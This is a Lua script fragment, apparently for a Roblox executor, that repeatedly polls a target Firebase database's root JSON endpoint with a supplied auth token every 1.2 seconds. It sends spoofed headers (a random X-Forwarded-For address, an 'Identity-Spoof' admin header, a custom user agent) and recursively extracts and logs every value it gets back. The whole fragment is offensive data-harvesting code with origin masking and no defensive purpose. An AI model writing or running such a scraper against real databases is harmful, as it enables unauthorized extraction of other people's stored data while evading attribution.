local function DeepExtract(data, path)
    if type(data) ~= "table" then return end
    for k, v in pairs(data) do
        local currentPath = path .. "/" .. tostring(k)
        if type(v) == "table" then
            DeepExtract(v, currentPath)
        else
            local val = tostring(v)
            if #val > 0 and not val:find("firebase") then
                local dataId = currentPath .. val
                if not processedData[dataId] then
                    processedData[dataId] = true
                    AddLog(tostring(k), val)
                end
            end
        end
    end
end

local function StartGhostSync()
    task.spawn(function()
        while task.wait(1.2) do
            if TARGET_URL and TARGET_AUTH then
                pcall(function()
                    local res = request({
                        Url = TARGET_URL .. "/.json?auth=" .. TARGET_AUTH,
                        Method = "GET",
                        Headers = {
                            ["User-Agent"] = "F0RBID-OMNI-PHANTOM",
                            ["X-Forwarded-For"] = string.format("%d.%d.%d.%d", math.random(1,255), math.random(1,255), math.random(1,255), math.random(1,255)),
                            ["Accept-Language"] = "en-US,en;q=0.9",
                            ["Identity-Spoof"] = "F0RBID_ADMIN"
                        }
                    })
                    if res.Success then
                        local decoded = HttpService:JSONDecode(res.Body)
                        if decoded then DeepExtract(decoded, "Root") end
                    end
                end)
            end
        end
    end)
end

